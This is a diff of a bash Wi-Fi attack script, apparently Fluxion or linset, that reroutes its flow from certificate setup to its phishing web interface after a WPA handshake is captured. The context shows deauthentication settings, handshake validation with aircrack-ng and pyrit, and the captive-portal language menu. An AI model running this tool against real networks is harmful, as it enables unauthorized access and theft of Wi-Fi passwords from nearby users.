@@ -24,7 +24,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=52
+revision=53
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -1402,7 +1402,7 @@ function askauth {
 		echo ""
 		case $yn in
 			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant";  certssl; break ;;
+			2 ) authmode="wpa_supplicant";  webinterface; break ;;
 			3 ) askAP; break ;;
 			* ) echo "$general_case_error"; conditional_clear ;;
 		esac
@@ -3213,7 +3213,7 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						 certssl
+						 webinterface
 					else
 					echo "Corrupted handshake"
 					echo
@@ -3422,7 +3422,7 @@ function checkhandshake {
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			certssl
+			webinterface
 			i=2
 			break
 
@@ -3436,7 +3436,7 @@ function checkhandshake {
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap strip &>$flux_output_device
-			certssl
+			webinterface
 			i=2
 			break
 
@@ -3521,11 +3521,11 @@ function creassl {
 
 ############################################# < ATAQUE > ############################################
 
-# Select web interface that will be used
+# Select attack strategie that will be used
 function webinterface {
 
-#Establece Permisos al Certificado ssl Autofirmado
-	chmod 400 $DUMP_PATH/server.pem
+
+	chmod 400 /root/server.pem
 
 	while true; do
 		conditional_clear
@@ -3578,7 +3578,6 @@ function webinterface {
 			echo -e "$blue""15)"$transparent" German      [GER]"
 			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
 			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
-			
 			echo
 			echo -n "#? "
 			read fluxass
